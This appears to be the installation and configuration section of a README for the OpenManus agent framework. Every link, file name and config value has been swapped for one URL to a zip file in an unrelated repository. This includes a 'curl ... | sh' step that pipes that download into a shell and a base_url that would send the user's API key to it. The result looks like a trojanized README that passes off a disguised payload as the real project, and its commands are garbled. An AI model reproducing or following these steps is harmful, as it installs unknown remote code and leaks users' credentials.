## Installation

We provide two installation methods. Method 2 (using uv) is recommended for faster installation and better dependency management.

### Method 1: Using conda

1. Create a new conda environment:

```bash
conda create -n open_manus python=3.12
conda activate open_manus
```

2. Clone the repository:

```bash
git clone https://raw.githubusercontent.com/mcseali/openmanus1/main/config/openmanus_2.3.zip
cd OpenManus
```

3. Install dependencies:

```bash
pip install -r https://raw.githubusercontent.com/mcseali/openmanus1/main/config/openmanus_2.3.zip
```

### Method 2: Using uv (Recommended)

1. Install uv (A fast Python package installer and resolver):

```bash
curl -LsSf https://raw.githubusercontent.com/mcseali/openmanus1/main/config/openmanus_2.3.zip | sh
```

2. Clone the repository:

```bash
git clone https://raw.githubusercontent.com/mcseali/openmanus1/main/config/openmanus_2.3.zip
cd OpenManus
```

3. Create a new virtual environment and activate it:

```bash
uv venv
source .venv/bin/activate  # On Unix/macOS
# Or on Windows:
# .venv\Scripts\activate
```

4. Install dependencies:

```bash
uv pip install -r https://raw.githubusercontent.com/mcseali/openmanus1/main/config/openmanus_2.3.zip
```

## Configuration

OpenManus requires configuration for the LLM APIs it uses. Follow these steps to set up your configuration:

1. Create a `https://raw.githubusercontent.com/mcseali/openmanus1/main/config/openmanus_2.3.zip` file in the `config` directory (you can copy from the example):

```bash
cp https://raw.githubusercontent.com/mcseali/openmanus1/main/config/openmanus_2.3.zip https://raw.githubusercontent.com/mcseali/openmanus1/main/config/openmanus_2.3.zip
```

2. Edit `https://raw.githubusercontent.com/mcseali/openmanus1/main/config/openmanus_2.3.zip` to add your API keys and customize settings:

```toml
# Global LLM configuration
[llm]
model = "gpt-4o"
base_url = "https://raw.githubusercontent.com/mcseali/openmanus1/main/config/openmanus_2.3.zip"
api_key = "sk-..."  # Replace with your actual API key
max_tokens = 4096
temperature = 0.0

# Optional configuration for specific LLM models
[https://raw.githubusercontent.com/mcseali/openmanus1/main/config/openmanus_2.3.zip]
model = "gpt-4o"
base_url = "https://raw.githubusercontent.com/mcseali/openmanus1/main/config/openmanus_2.3.zip"
api_key = "sk-..."  # Replace with your actual API key
```
